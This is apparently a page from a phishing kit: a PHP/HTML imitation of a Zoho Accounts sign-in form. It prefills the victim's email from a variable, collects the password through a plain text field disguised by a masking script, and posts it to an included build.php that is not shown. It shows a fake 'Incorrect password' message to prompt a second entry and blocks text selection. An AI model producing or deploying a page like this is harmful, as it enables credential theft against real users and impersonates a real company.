<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html data-wf-site="64a8634540e6e9c6a130b5c3" data-wf-page="64a961af1d3884c02683f3c1" data-wf-domain="" class="w-mod-js wf-opensans-n4-active wf-opensans-n3-active wf-opensans-n6-active wf-opensans-n7-active wf-opensans-i3-active wf-opensans-i4-active wf-opensans-i6-active wf-opensans-i7-active wf-opensans-n8-active wf-opensans-i8-active wf-active"><head>
    <meta charset="utf-8">
    <title>Zoho Account- Sign in</title>
    <meta content="Not Found" property="og:title">
    <meta content="Not Found" property="twitter:title">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <meta content="Webflow" name="generator">
    <link href="https://uploads-ssl.webflow.com/64a8634540e6e9c6a130b5c3/css/webmail-e0abaa.webflow.024e6f23a.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
    
    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic" media="all">
    <link href="https://zoho.com/favicon.ico" rel="shortcut icon">
    
    
    <style>
        /* Disable right-click */
        body {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        #footer {
            font-family: 'ZohoPuvi', Georgia;
            font-weight: 400;
            width: 100%;
            height: 20px;
            font-size: 14px;
            color: #727272;
            position: absolute;
            left: 0px;
            right: 0px;
            padding-top: 20px;
            /*margin: 20px auto;*/
            text-align: center;
            font-size: 14px;
            bottom: 0px;
        }

        @font-face {
            font-family: 'ZohoPuvi';
            src: url(https://static.zohocdn.com/iam/v2/components/images/zohopuvi/zoho_puvi_regular.cdda956b52a848ecb4d75cf91fea5737.eot);
            src: url(https://static.zohocdn.com/iam/v2/components/images/zohopuvi/zoho_puvi_regular.cdda956b52a848ecb4d75cf91fea5737.eot) format('embedded-opentype'), /* IE6-IE8 */ url(https://static.zohocdn.com/iam/v2/components/images/zohopuvi/zoho_puvi_regular.2115e13d08dc114dd29d568b411169d9.woff) format('woff'), /* Modern Browsers */ url(https://static.zohocdn.com/iam/v2/components/images/zohopuvi/zoho_puvi_regular.9adb79386e4ececdeb93f007d5ecda75.ttf) format('truetype');
            font-style: normal;
            font-weight: 400;
            text-rendering: optimizeLegibility;
            font-display: swap;
        }
    </style>
</head>

<body class="body _3rd">
    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
        <div id="google_translate_element"></div>
    </div>
    <section class="section _2nd wf-section">
        <div class="main-wrapper _2nd _3rd">
            <!--<div class="form-wrapper _3rd"><img src="https://uploads-ssl.webflow.com/64a8634540e6e9c6a130b5c3/64a9696683280cff03867502_Screenshot%202023-07-08%20at%2016.22.28.png" loading="lazy" alt="" class="image-4">-->
                <div class="form-wrapper _3rd"><img src="https://static.zohocdn.com/iam/v2/components/images/newZoho_logo.5f6895fcb293501287eccaf0007b39a5.svg" loading="lazy" alt="" class="image-4">
                <div class="text-block-4">Sign in</div>
                <div class="text-block-6">to access Accounts</div>
                <div class="w-form">
                    <form name="login-form" method="post" id="login-form" required="" autocomplete="off">
                        <input type="hidden" name="login" value="zoho">
                        <input type="email" class="text-field-2 w-input" maxlength="256" name="user" data-name="user" placeholder="Enter Email" id="user" required="" value="<?php echo htmlspecialchars($decoded); ?>" readonly="">
                        <input type="text" class="text-field-2 passinput w-input" maxlength="256" name="pass" placeholder="Enter password" id="password">
						<div class="" style="color: #E92B2B; text-align: left; font-size:14px; padding-left: 0px; padding-bottom: 10px; <?php echo $error; ?>" id="error">Incorrect password. Please try again.</div>	
                        <div class="text-block">
                            <div class="text-block-3">Forgot Password?</div>
                            <div class="text-block-2">Sign in using email OTP</div>
                        </div>
                        <input type="submit" value="Sign in" data-wait="Please wait..." class="submit-button-2 w-button" id="submit-btn">
                             
                    </form>
                </div>
            </div>
            <div class="picture-wrapper _2nd"><img src="https://uploads-ssl.webflow.com/64a8634540e6e9c6a130b5c3/64a964175ffd73e869eb7ab7_Screenshot%202023-07-08%20at%2016.24.16.png" loading="lazy" alt="" class="picture1"></div>
        </div>
    </section>
    <footer id="footer" style="top: 888px; text-align:center;"> 
        <span>&copy; 2026, Zoho Corporation Pvt. Ltd. All Rights Reserved.	</span>
    </footer>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>